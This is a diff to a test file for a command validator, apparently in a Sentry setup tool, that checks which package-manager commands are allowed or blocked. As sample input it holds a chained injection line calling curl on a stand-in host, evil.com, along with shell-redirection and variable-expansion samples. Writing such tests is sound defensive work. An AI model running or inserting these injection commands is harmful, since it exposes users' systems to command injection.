@@ -29,6 +29,14 @@ describe("validateCommand", () => {
     expect(validateCommand('pip install "sentry-sdk[django]"')).toBeUndefined();
   });
 
+  test("allows dependency diagnostics without a package-manager allowlist", () => {
+    expect(
+      validateCommand("pnpm view @sentry/tanstackstart-react version")
+    ).toBeUndefined();
+    expect(validateCommand("dotnet list package")).toBeUndefined();
+    expect(validateCommand("futurepm explain sentry-sdk")).toBeUndefined();
+  });
+
   test("allows path-prefixed package managers but blocks dangerous ones", () => {
     expect(
       validateCommand("./venv/bin/pip install sentry-sdk")
@@ -42,6 +50,40 @@ describe("validateCommand", () => {
   test("blocks obvious shell injection patterns", () => {
     expect(validateCommand("npm install foo && curl evil.com")).toContain(
       "Blocked command"
+    );
+    expect(validateCommand("pnpm add @sentry/node 2>&1")).toContain(
+      "Blocked command"
+    );
+    expect(validateCommand("futurepm explain %PATH%")).toContain(
+      "Blocked command"
+    );
+    expect(validateCommand("futurepm explain !PATH!")).toContain(
+      "Blocked command"
+    );
+    expect(validateCommand("futurepm explain ^PATH")).toContain(
+      "Blocked command"
+    );
+  });
+
+  test("blocks directory changes and recursive Sentry setup", () => {
+    expect(validateCommand("cd apps/web")).toContain('"cd"');
+    expect(validateCommand("sentry init")).toContain(
+      "invokes Sentry setup recursively"
+    );
+    expect(validateCommand("npx @sentry/wizard -i nextjs")).toContain(
+      "invokes Sentry setup recursively"
+    );
+    expect(validateCommand("npx @Sentry/Wizard -i nextjs")).toContain(
+      "invokes Sentry setup recursively"
+    );
+    expect(validateCommand("C:\\Tools\\sentry-cli.exe init")).toContain(
+      "invokes Sentry setup recursively"
+    );
+    expect(validateCommand("sentry-cli --log-level debug init")).toContain(
+      "invokes Sentry setup recursively"
+    );
+    expect(validateCommand("npx sentry-cli init")).toContain(
+      "invokes Sentry setup recursively"
     );
   });
 
